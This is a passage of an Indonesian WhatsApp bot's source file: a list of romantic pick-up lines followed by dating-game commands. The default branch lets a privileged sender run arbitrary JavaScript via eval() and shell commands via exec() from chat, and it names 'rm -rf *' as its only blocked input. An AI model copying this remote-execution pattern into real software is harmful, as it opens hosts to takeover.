kamu. mungkin kamu akan kaget mendengarnya. selama ini aku menyukaimu.", "aku nggak pengin kamu jadi matahari di hidupku, karena walaupun hangat, kamu sangat jauh. aku juga nggak mau kamu jadi udara, karena walaupun aku butuh dan kamu sangat dekat, tapi semua orang juga bisa menghirupmu. aku hanya ingin kamu jadi darah yang bisa sangat dekat denganku.", "aku nggak tahu sampai kapan usiaku berakhir. yang aku tahu, cintaku ini selamanya hanya untukmu.", "aku sangat menikmati waktu yang dihabiskan bersama hari ini. kita juga sudah lama saling mengenal. di hari yang cerah ini, aku ingin mengungkapkan bahwa aku mencintaimu.", "aku selalu membayangkan betapa indahnya jika suatu saat nanti kita dapat membina bahtera rumah tangga dan hidup bersama sampai akhir hayat. namun, semua itu tak mungkin terjadi jika kita berdua sampai saat ini bahkan belum jadian. maukah kamu menjadi kekasihku?", "aku siapkan mental untuk hari ini. kamu harus menjadi pacarku untuk mengobati rasa cinta yang sudah tak terkendali ini.", "aku tahu kita nggak seumur, tapi bolehkan aku seumur hidup sama kamu?", "aku tahu kita sudah lama sahabatan. tapi nggak salah kan kalau aku suka sama kamu? apa pun jawaban kamu aku terima. yang terpenting itu jujur dari hati aku yang terdalam.", "aku tak bisa memulai ini semua terlebih dahulu, namun aku akan berikan sebuah kode bahwa aku menyukai dirimu. jika kau mengerti akan kode ini maka kita akan bersama.", "aku yang terlalu bodoh atau kamu yang terlalu egois untuk membuat aku jatuh cinta kepadamu.", "apa pun tentangmu, tak pernah ku temukan bosan di dalamnya. karena berada di sampingmu, anugerah terindah bagiku. jadilah kekasihku, hey kamu.", "atas izin allah dan restu mama papa, kamu mau nggak jadi pacarku?", "bagaimana kalau kita jadi komplotan pencuri? aku mencuri hatimu dan kau mencuri hatiku.", "bahagia itu kalau aku dan kamu telah menjadi kita.", "besok kalau udah nggak gabut, boleh nggak aku daftar jadi pacar kamu. biar aku ada kerjaan buat selalu mikirin kamu.", "biarkan aku membuatmu bahagia selamanya. kamu hanya perlu melakukan satu hal: jatuh cinta denganku.", "biarkan semua kebahagiaanku menjadi milikmu, semua kesedihanmu menjadi milikku. biarkan seluruh dunia menjadi milikmu, hanya kamu yang menjadi milikku!", "biarlah yang lalu menjadi masa laluku, namun untuk masa kini maukah kamu menjadi masa depanku?", "bisakah kamu memberiku arahan ke hatimu? sepertinya aku telah kehilangan diriku di matamu.", "bukanlah tahta ataupun harta yang aku cari, akan tetapi balasan cintaku yang aku tunggu darimu. dijawab ya.", "caramu bisa membuatku tertawa bahkan di hari-hari tergelap membuatku merasa lebih ringan dari apa pun. aku mau kamu jadi milikku.", "cinta aku ke kamu itu jangan diragukan lagi karena cinta ini tulus dari lubuk hati yang paling dalam.", "cintaku ke kamu tuh kayak angka 5 sampai 10. nggak ada duanya. aku mau kamu jadi satu-satunya wanita di hatiku.", "cowok mana yang berani-beraninya nyakitin kamu. sini aku obati, asal kamu mau jadi pacar aku.", "hai, kamu lagi ngapain? coba deh keluar rumah dan lihat bulan malam ini. cahayanya indah dan memesona, tapi akan lebih indah lagi kalau aku ada di sampingmu. gimana kalau kita jadian, supaya setelah malam ini bisa menatap rembulan sama-sama?", "hidupku indah karena kamu bersamaku, kamu membuatku bahagia bahkan jika aku merasa sedih dan rendah. senyummu menerangi hidupku dan semua kegelapan menghilang. maukah kamu menjadi milikku?", "ini bukan rayuan, tapi ini yang aku rasakan. aku ingin bertukar tulang denganmu. aku jadi tulang punggungmu, kamu jadi tulang rusukku. jadian yuk!", "ini cintaku, ambillah. ini jiwaku, gunakan itu. ini hatiku, jangan hancurkan. ini tanganku, pegang dan bersama-sama kita akan membuatnya abadi.", "izinkan aku mengatakan sesuatu yang menurutku sangat penting. hey, kau punya tempat di hatiku yang tidak bisa dimiliki oleh orang lain. tetaplah di sana dan jadilah kekasihku. mau?", "jika aku bisa memberimu hadiah, aku akan memberimu cinta dan tawa, hati yang damai, mimpi dan kegembiraan khusus selamanya. biarkan aku melakukannya sekarang.", "kalau aku matahari, kamu mau nggak jadi langitku? biar setiap saat setiap waktu bisa selalu bersama tanpa terpisah waktu.", "kalau kamu membuka pesan ini, berarti kamu suka sama aku. kalau kamu membalas pesan ini, artinya kamu sayang sama aku. kalau kamu mengabaikan pesan ini, berarti kamu cinta sama aku. kalau kamu menghapus pesan ini, artinya kamu mau menerimaku jadi pacarmu.", "kalau kau bertanya-tanya apakah aku mencintaimu atau tidak, jawabannya adalah iya.", "kamu adalah satu-satunya yang lebih mengerti aku daripada diriku sendiri. kamu adalah satu-satunya yang dapat ku bagi segalanya, bahkan rahasia pribadiku. aku ingin kamu selalu bersamaku. aku mencintaimu.", "kamu harus membiarkan aku mencintaimu, biarkan aku menjadi orang yang memberimu semua yang kamu inginkan dan butuhkan.", "kamu itu beda dari cewek lain, kamu antik jarang ditemukan di tempat lain. maukah kamu jadi pacar aku?", "kamu kenal iwan nggak? iwan to be your boy friend.", "kamu mau nggak jadi matahari di kehidupanku? kalau mau, menjauhlah 149.6 juta km dari aku sekarang!", "kamu nggak capek hts-an sama aku? aku capek tiap hari jemput kamu, nemenin kamu pas lagi bad mood, menghibur kamu pas lagi sedih. kita pacaran aja, yuk?", "kamu nggak sadar ya, nggak perlu capek nyari kesana kemari, orang yang tulus mencintai kamu ada di depan mata. iya, aku.", "kamu pantas mendapatkan yang terbaik, seseorang yang akan mendukungmu tanpa batas, membiarkanmu tumbuh tanpa batas, dan mencintaimu tanpa akhir. apakah kamu akan membiarkan aku menjadi orangnya?", "kamu tahu enggak kenapa aku ngambil jurusan elektro? karena aku mau bikin pembangkit listrik tenaga cinta kita, supaya rumah tangga kita nanti paling terang.", "kamu tahu kenapa hari ini aku menyatakan semua ini padamu? karena aku lebih memilih untuk malu karena menyatakan cinta ditolak ketimbang menyesal karena orang lain yang lebih dulu menyatakannya.", "kamu telah hidup dalam mimpiku untuk waktu yang lama, bagaimana jika menjadikannya nyata untuk sekali saja?", "kenapa aku baru sadar, ternyata selama ini hatiku nyaman bersanding denganmu. aku mau kamu jadi milikku.", "kepada cewek incaran bukanlah perkara yang mudah. ada banyak hal yang perlu dipertimbangkan agar cintamu bisa diterima si doi. selain memilih waktu yang tepat, kata-kata untuk nembak cewek pun harus dipersiapkan.", "ketika aku bertemu denganmu, aku tak peduli dengan semuanya. namun, ketika kamu pergi jauh dariku aku selalu mengharapkanmu. dan apakah ini cinta?", "ketika engkau memandangku, engkau akan melihat fisikku. tetapi ketika engkau melihat hatiku, engkau akan menemukan dirimu sendiri ada di sana.", "ketika hawa tercipta buat sang adam, begitu indah kehidupan mereka. izinkan aku menjadi sang adam/hawa buatmu karena aku sangat mencintaimu.", "ketika mata ini memandang raut wajahmu yang indah, hanya tiga kata yang terucap dari lubuk hatiku yang paling dalam 'aku cinta kamu'.", "kita udah saling tahu masa lalu masing-masing. tapi itu tidak penting karena sekarang aku hanya ingin membicarakan tentang masa depan. mulai hari ini dan seterusnya, maukah kamu menjadi pacarku?", "ku beranikan hari ini untuk mengungkapkan yang selama ini menjadi resah. resah jika kamu tak menjadi milikku selamanya.", "lebih spesial dari nasi goreng, lebih indah dari purnama. ya, jika kamu yang temani akhir hidupku.", "maaf sebelumnya karena cuma bisa bilang lewat wa. sebenarnya, selama ini aku memendam cinta dan aku ingin kamu jadi pacarku. mau?", "makanan busuk memanglah bau, kalau dimakan rasanya pahit sepahit jamu. sebenarnya aku ingin kamu tahu, aku mau kamu terima cintaku.", "makan tahu bumbu petis. merenung sambil makan buah duku. aku bukan lelaki yang romantis. namun, maukah kau jadi pacarku?", "makasih, ya, selama ini sudah mau temani aku. entah itu dalam suka ataupun duka. tapi sekarang aku mau kamu berubah. aku mau kamu bukan lagi jadi temanku, tapi aku mau kamu jadi pacarku.", "malam ini sangat indah dengan cahaya rembulan yang memesona namun akan lebih indah kalau kamu resmi menjadi milikku.", "mau jadi pacarku nggak, lagi gabut nih. coba dulu 1 bulan kalau nyaman lanjut deh.", "menjadi teman memang menyenangkan. akan lebih membahagiakan jika kamu menjadi milikku.", "meski jarang buat kamu tertawa, setidaknya saya tidak selalu buat kamu sedih. tapi kalau akhirnya humor saya tidak membuatmu tertawa lagi, semoga sedih saya bisa kamu tertawakan, ya. - zarry hendrik", "meskipun aku memiliki banyak hal untuk dikatakan, tetapi kata-kataku bersembunyi dariku dan aku tidak bisa mengungkapkannya. hal sederhana yang ingin aku katakan adalah aku mencintaimu hari ini dan selalu.", "mungkin aku bukan obama, tapi aku senang kalau bisa manggil kamu, o sayang. kamu mau nggak mulai saat ini aku panggil seperti itu?", "mungkin aku tak sanggup menyeberangi lautan, menghantam karang atau menerjang badai. tapi satu yang aku sanggup, membuatmu bahagia. izinkan aku membuktikannya, ya!", "neng, bakar-bakaran yuk! | bakar apa? | kita bakar masa lalu dan buka lembaran baru dengan cinta kita.", "nggak perlu basa basi. kita udah kenal lama, aku suka kamu apa adanya. jadian yuk!", "pepatah mengatakan, empat sehat lima sempurna. namun, aku tidak merasakan kesempurnaan itu sebelum aku merasakan kasih sayangmu.", "saatnya aku mengungkapkan perasaan yang terdalam kepadamu. aku ingin kamu tahu bahwa aku mencintaimu seperti aku tidak pernah mencintai siapa pun sebelumnya.", "saking jatuh cintanya aku sama kamu. mendengar kamu kentut aja aku sudah bahagia.", "satu tambah satu sama dengan dua. aku tanpamu nggak bisa apa-apa. satu dua tiga sepuluh. aku maunya kamu jadi pacarku.", "secantik-canriknya kamu, itu nggak ada gunanya kalau nggak jadi punyaku.", "sejak kenal kamu, bawaannya pengin belajar terus. belajar jadi yang terbaik. untuk selanjutnya, kamu mau nggak ngebimbing aku, selalu ada di sampingku?", "senjata bertuah amatlah sakti. kalah oleh iman nan hakiki. maukah kau jadi orang yang aku kasihi? aku janji cintaku sampai mati.", "seseorang bermimpi tentangmu setiap malam. seseorang tidak bisa bernapas tanpamu, kesepian. seseorang berharap suatu hari kau akan melihatnya. seseorang itu adalah aku.", "setelah hari berlalu, aku yakin kamu pilihanku.", "setelah sekian lama bersama, aku ingin kita tidak hanya sekadar teman saja. aku yakin kamu paham maksudku, dan aku berharap semoga kamu setuju. aku mencintaimu.", "suatu ketika, ada seorang laki-laki yang mencintai perempuan yang tawanya bagaikan sebuah pertanyaan yang seumur hidup ingin dijawabnya. akulah laki-laki itu, seorang laki-laki yang sedang menginginkan perempuan untuk jawaban di hidupnya. perempuan itu adalah kamu.", "suka maupun duka, senang maupun susah, kamu telah menghiasi hariku saat aku bersamamu dan aku mau kita selamanya dekat denganmu karena aku mau kamu jadi pacar aku?", "tak ada alasan yang pasti dan jelas kenapa aku cinta kamu, tapi yang pasti aku menginginkan aku bahagia denganmu dan tak ingin sampai kamu terluka.", "tak bisa dibayangkan jika di dunia ini tak ada yang namanya cinta. ya, rasa cinta bagi sebagian orang memberi keindahan yang membuat hari-hari semakin berwarna. apalagi jika perasaan cinta yang kita punya dibalas oleh orang yang kita suka.", "tak hanya menyenangkan, aku yakin kamu dapat diandalkan di masa depan.", "tak ragu lagi untuk ungkapkan kepada seseorang yang ada di hati. itu adalah kamu.", "telah banyak waktuku terlewati bersamamu, suka maupun duka senang maupun susah kamu telah menghiasi hariku saat aku bersamamu dan aku mau kita selamanya dekat denganmu. karena aku mau kamu jadi pacar aku?", "tidak peduli seberapa sederhanya dan ketidakjelasan kamu. tapi bagi aku, kamu adalah kesempurnaan yang memiliki kejelasan. aku mau kamu jadi pacarku.", "untuk apa memajang foto berdua? yang aku mau fotomu ada dalam buku nikahku kelak. maukah kamu jadi pacarku?"
];
					let katakata = await pickRandom(ktnmbk)
				    let teks = `love Message...\n\n> @${m.sender.split("@")[0]}\n❤️❤️\n@${users.split("@")[0]}\n\n"${katakata}"`
					conn.jadian[users] = [
						reply(),
						m.sender
					]
                    let hehe = `kamu baru saja mengajak @${users.split("@")[0]} jadian\n\n@${users.split("@")[0]} silahkan beri keputusan🎉\n${prefix}terima atau ${prefix}tolak`
                    conn.sendMessage(m.chat, {
                        text: hehe,
                        footer: "© ZuuStillLove - 2025",
                        buttons: [ 
                            {
                                buttonId: `${prefix}terima`,
                                buttonText: {
                                    displayText: 'terima' 
                                }, type: 1 },
                            {
                                buttonId: `${prefix}tolak`,
                                buttonText: {
                                    displayText: 'ogah'
                                }, type: 1 }
                        ],
                        headerType: 1,
                        viewOnce: true
                        },{ quoted: m })
                }
			}
			break
                
			case 'terima': {
                if (isBan) return
				if (!m.isGroup) return reply(mess.group)
				if (conn.jadian[m.sender]) {
					let user = conn.jadian[m.sender][1]
					global.db.data.users[user].pacar = m.sender
					global.db.data.users[m.sender].pacar = user
					reply(`horeee\n\n${m.sender.split("@")[0]} jadian dengan\n❤️ ${user.split("@")[0]}\n\nsemoga langgeng 🙈😋`)
					delete conn.jadian[m.sender]
				} else {
					reply("anjirr?")
				}
			}
			break
                
			case 'tolak': {
                if (isBan) return
				if (!m.isGroup) return reply(mess.group)
				if (conn.jadian[m.sender]) {
					let user = conn.jadian[m.sender][1]
					reply(`@${user.split("@")[0]} wowkaowka di tolak`)
					delete conn.jadian[m.sender]
				} else {
					reply("anjirr?")
				}
			}
			break
                
			case 'putus': {
                if (isBan) return
				if (!m.isGroup) return reply(mess.group)
				let pasangan = global.db.data.users[m.sender].pacar
				if (pasangan) {
					global.db.data.users[m.sender].pacar = ""
					global.db.data.users[pasangan].pacar = ""
					reply(`horeee kamu putus sama @${pasangan.split("@")[0]}`)
				} else {
					reply("anjirr?")
				}
			}
			break
                
			case 'cekpacar': {
                if (isBan) return
				if (!m.isGroup) return reply(mess.group)
				try {
					let user = m.mentionedJid[0] || (m.quoted ? m.quoted.sender : "");
					if (!user) return reply(`tag/reply seseorang, contoh: ${prefix + command} @628888`)
					let pasangan = global.db.data.users[user].pacar
					if (pasangan) {
						reply(`@${user.split("@")[0]} udah ❤️ sama @${pasangan.split("@")[0]}`)
					} else {
						reply(`@${user.split("@")[0]} masih jomblo`)
					}
				} catch (error) {
                      let user = m.mentionedJid[0] || (m.quoted ? m.quoted.sender : "");
					reply(`@${user.split("@")[0]} tidak ada didalam database njrrr`)
				}
			}
			break
                
default:
if (body.startsWith("~")) {
    if (!Access) return;
    reply('*execute...*')
    function Return(sul) {
        let sat = JSON.stringify(sul, null, 2);
        let bang = util.format(sat);
        if (sat === undefined) {
            bang = util.format(sul);
        }
        return bang;
    }
    try {
        (async () => {
            try {
                const result = await eval(`(async () => { return ${text} })()`);
                reply(Return(result));
            } catch (e) {
                reply(util.format(e));
            }
        })();
    } catch (e) {
        reply(util.format(e));
    }
}
			
if (budy.startsWith("X")) {
    if (!Access) return
    await reaction(m.chat, '⚡')
    try {
        let evaled = await eval(q);
        if (typeof evaled !== "string") evaled = util.inspect(evaled);
        await reply(evaled);
    } catch (e) {
        await reply(`Error: ${String(e)}`);
    }
}
                
if (budy.startsWith('-')) {
    if (!Access) return
    await reaction(m.chat, '⚡')
    if (text == "rm -rf *") return m.reply("😹")
    exec(budy.slice(2), (err, stdout) => {
        if (err) return m.reply(`${err}`)
        if (stdout) return m.reply(stdout)  
    })
}
 
}
        
 const loadCommands = () => {
    return fs.readdirSync(path.join(__dirname, './plugin'))
        .filter(file => file.endsWith('.js'))
        .map(file => require(path.join(__dirname, './plugin', file)));
};

let commands = loadCommands();
        
const cmd = commands.find(cmd => Array.isArray(cmd.command) ? cmd.command.includes(command) : cmd.command === command ); if (cmd) {
    await cmd.execute(conn, m, args, reply, Access, isBotAdmins, isAdmins, command, quoted, cinahitam, getRandomFile, addExif, pushname, makeStickerFromUrl, prefix, command, botNumber, reaction);
}
    } catch (err) {
        console.log(require("util").format(err));
    }
};

let file = require.resolve(__filename);
fs.watchFile(file, () => {
  fs.unwatchFile(file);
  console.log(`Update detected in ${__filename}`);
  delete require.cache[file];
  require(file);
});

const pluginDir = path.resolve(__dirname, './plugin');
fs.readdir(pluginDir, (err, files) => {
  if (err) {
    console.error(`Failed to read directory ${pluginDir}:`, err);
    return;
  }
  files.forEach((filename) => {
    const pluginFile = path.join(pluginDir, filename);
    fs.watchFile(pluginFile, () => {
      fs.unwatchFile(pluginFile);
      console.log(`Update detected in ${pluginFile}`);
      delete require.cache[require.resolve(pluginFile)];
      require(pluginFile);
    });
  });
});

/*

dencrypt by https://t.me/YDqrsc

Error ? fix sendiri 

*/